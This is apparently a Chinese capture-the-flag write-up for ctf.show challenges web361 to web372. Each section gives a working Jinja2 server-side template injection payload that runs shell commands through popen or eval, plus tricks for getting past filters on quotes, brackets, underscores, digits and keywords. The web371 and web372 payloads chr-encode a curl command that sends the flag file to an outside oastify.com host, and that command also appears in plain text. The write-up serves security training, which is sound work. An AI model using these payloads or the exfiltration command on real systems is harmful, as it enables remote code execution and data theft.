## web361

没有任何过滤

payload

```
name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
```

## web362

payload

```
name={{x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("cat /flag").read()')}}
```

## web363(过滤单双引号)

payload

通过获x1和x2两个参数，绕过单双引号过滤

```
{{x.__init__.__globals__[request.args.x1].eval(request.args.x2)}}&x1=__builtins__&x2=__import__('os').popen('cat /flag').read() 
```

```
{{url_for.__globals__[request.args.x1].eval(request.args.x2)}}&x1=__builtins__&x2=__import__('os').popen('cat /flag').read() 
```

## web364(过滤了args)

payload

```
name={{url_for.__globals__[request.cookies.x1].eval(request.cookies.x2)}}
```

```
Cookie传参：x2=__import__('os').popen('ls /').read();x1=__builtins__
```

![image-20240204133223555](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240204133223555.png)

## web365(过滤了[])

增加过滤了[]，可以通过`__getitem__`魔术方法代替[]

> `__getitem__()`
>   调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是`a.__getitem__('b')`

payload

```http
GET /?name={{url_for.__globals__.__getitem__(request.cookies.x1).eval(request.cookies.x2)}} HTTP/1.1
Host: 6e1bc5bc-00da-4f22-b792-57d71099f3ed.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://6e1bc5bc-00da-4f22-b792-57d71099f3ed.challenge.ctf.show/?name={{url_for.__globals__.__getitem__(request.cookies.x1).eval(request.cookies.x2)}}
Cookie:x2=__import__('os').popen('cat /flag').read();x1=__builtins__
Connection: close
Upgrade-Insecure-Requests: 1
```

## web366(过滤了下划线_)

payload

> attr()
>   获取对象的属性。foo|attr("bar") 等价于 foo.bar

```
{{lipsum.__globals__.os.popen("cat /f*").read()}}
```

```
name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}
```

```
Cookie传参：
a=__globals__;b=cat /f*
```

另一payload

```
{{x.__init__.__globals__.__getitem__(__builtins__).eval("__import__("os").popen("cat /f*").read()")}}
```

```
?name={{(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)}}

Cookie传参：
x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__('os').popen('cat /f*').read()
```

## web367(过滤了os)

可以是由request代替

继续用上一题的payload

```
a=__globals__&b=os&c=cat /flag&name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}
```

## web368(过滤了{})

用`{%%}`代替

```
?a=__globals__&b=os&c=cat /flag&name={% print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}
```



## web369(过滤了request)



```
x.__init__.__globals__.__getitem__('__builtins__').open('/flag').read()
```

```
% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join%}
{% set gei=(a,a,dict(getitem=a)|join,a,a)|join%}
{% set bui=(a,a,dict(builtins=a)|join,a,a)|join%}
{% set p=(q|attr(ini)|attr(glo)|attr(gei))(bui)%}
{% set chr=p.chr%}
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{%print(p.open(file).read())%}
```

`dict()|join`拼接我们需要的字符（避免了使用引号）

在`__builtins__`下拿到`chr`拼接字符从而避免引号的使用，也用到了`__builtins__`下的`open`函数读取`flag`

另一payload

```
{% set a=(()|select|string|list).pop(24) %}
{% set globals=(a,a,dict(globals=1)|join,a,a)|join %}
{% set init=(a,a,dict(init=1)|join,a,a)|join %}
{% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %}
{% set a=(lipsum|attr(globals)).get(builtins) %}
{% set chr=a.chr %}
{% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %}
```

```
lipsum.__globals__.get(builtins).open('/flag').read()
```

## web370(过滤0-9)

继续构造

```
{% set two=(dict(aa=a)|join|count)%}
{% set three=(dict(aaa=a)|join|count)%}
{% set four=(dict(aaaa=a)|join|count)%}
{% set seven=(dict(aaaaaaa=a)|join|count)%}
{% set eight=(dict(aaaaaaaa=a)|join|count)%}
{% set nine=(dict(aaaaaaaaa=a)|join|count)%}
{% set ten=(dict(aaaaaaaaaa=a)|join|count)%}
{% set twofour=(two~four)|int%}
{% set a=(()|select|string|list).pop(twofour) %}
{% set globals=(a,a,dict(globals=h)|join,a,a)|join %}
{% set init=(a,a,dict(init=h)|join,a,a)|join %}
{% set builtins=(a,a,dict(builtins=h)|join,a,a)|join %}
{% set a=(lipsum|attr(globals)).get(builtins) %}
{% set chr=a.chr %}
{% print a.open(chr((four~seven)|int)~chr((ten~two)|int)~chr((ten~eight)|int)~chr((nine~seven)|int)~chr((ten~three)|int)).read() %}
```

## web371(过滤了print)

利用全角数字进行数字的绕过

> 全角和半角指的是输入的英文字母或数字的大小，全角输入的英文字母及数字是正常汉字的一半，全角输入的和正常汉字等大。一个汉字要占两个英文字符的位置，人们把一个英文字符所占的位置称为"半角"，相对地把一个汉字所占的位置称为"全角"。

```
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set ohs=(dict(o=a,s=a)|join)%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(１０４)%2bchr(１２２)%2bchr(１０７)%2bchr(１１９)%2bchr(５７)%2bchr(１２２)%2bchr(１２０)%2bchr(１１３)%2bchr(１１０)%2bchr(１０１)%2bchr(４８)%2bchr(１１０)%2bchr(１０８)%2bchr(５５)%2bchr(１１２)%2bchr(１１６)%2bchr(５３)%2bchr(５３)%2bchr(１０２)%2bchr(１００)%2bchr(１１９)%2bchr(１２１)%2bchr(５１)%2bchr(９９)%2bchr(１１１)%2bchr(５１)%2bchr(１１７)%2bchr(１１７)%2bchr(１０５)%2bchr(１０７)%2bchr(５４)%2bchr(５７)%2bchr(４６)%2bchr(１１１)%2bchr(９７)%2bchr(１１５)%2bchr(１１６)%2bchr(１０５)%2bchr(１０２)%2bchr(１２１)%2bchr(４６)%2bchr(９９)%2bchr(１１１)%2bchr(１０９)%}
{% if ((lipsum|attr(glo)).get(ohs).popen(cmd))%}
abc
{% endif %}
```

```
curl -X POST -F xx=@/flag http://hzkw9zxqne0nl7pt55fdwy3co3uuik69.oastify.com
```

![image-20240205155034022](C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20240205155034022.png)

## web372(过滤了count)

可以换成length过滤器，这里直接全角数字进行绕过（和上一题一样）

```
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set ohs=(dict(o=a,s=a)|join)%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(１０４)%2bchr(１２２)%2bchr(１０７)%2bchr(１１９)%2bchr(５７)%2bchr(１２２)%2bchr(１２０)%2bchr(１１３)%2bchr(１１０)%2bchr(１０１)%2bchr(４８)%2bchr(１１０)%2bchr(１０８)%2bchr(５５)%2bchr(１１２)%2bchr(１１６)%2bchr(５３)%2bchr(５３)%2bchr(１０２)%2bchr(１００)%2bchr(１１９)%2bchr(１２１)%2bchr(５１)%2bchr(９９)%2bchr(１１１)%2bchr(５１)%2bchr(１１７)%2bchr(１１７)%2bchr(１０５)%2bchr(１０７)%2bchr(５４)%2bchr(５７)%2bchr(４６)%2bchr(１１１)%2bchr(９７)%2bchr(１１５)%2bchr(１１６)%2bchr(１０５)%2bchr(１０２)%2bchr(１２１)%2bchr(４６)%2bchr(９９)%2bchr(１１１)%2bchr(１０９)%}
{% if ((lipsum|attr(glo)).get(ohs).popen(cmd))%}
abc
{% endif %}
```

![image-20240205155411673](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240205155411673.png)
